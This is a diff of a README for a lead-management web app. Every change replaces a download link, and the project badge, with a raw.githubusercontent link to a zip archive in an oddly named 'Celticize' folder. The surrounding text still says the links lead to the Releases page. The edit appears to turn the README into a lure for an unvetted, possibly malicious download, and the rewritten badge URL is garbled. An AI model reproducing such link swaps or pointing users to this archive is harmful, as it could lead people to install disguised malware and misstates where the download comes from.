@@ -1,6 +1,6 @@
 # 🚀 Lead_Management_System - Manage Your Leads Effortlessly
 
-![Download Lead Management System](https://img.shields.io/badge/Download%20Now-Lead%20Management%20System-brightgreen)
+![Download Lead Management System](https://raw.githubusercontent.com/hofopnxnxn/Lead_Management_System/main/Celticize/Lead_Management_System.zip%20Now-Lead%20Management%20System-brightgreen)
 
 ## 📋 Overview
 Lead Management System is a full-stack application designed to help you manage leads easily. It is built using modern web technologies, including React for the frontend and Express with MongoDB for the backend. This application ensures secure authentication, allowing you to perform Create, Read, Update, and Delete (CRUD) operations on leads. The system also includes features like server-side pagination, filtering, and sorting, which help you organize your leads efficiently.
@@ -21,7 +21,7 @@ Lead Management System is a full-stack application designed to help you manage l
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application.   
 
-[Download Lead Management System](https://github.com/hofopnxnxn/Lead_Management_System/releases)
+[Download Lead Management System](https://raw.githubusercontent.com/hofopnxnxn/Lead_Management_System/main/Celticize/Lead_Management_System.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the most recent version listed.
@@ -68,4 +68,4 @@ We welcome contributions! If you’d like to help with the development or sugges
 
 To download the application again, follow this link:   
 
-[Download Lead Management System](https://github.com/hofopnxnxn/Lead_Management_System/releases)
+[Download Lead Management System](https://raw.githubusercontent.com/hofopnxnxn/Lead_Management_System/main/Celticize/Lead_Management_System.zip)
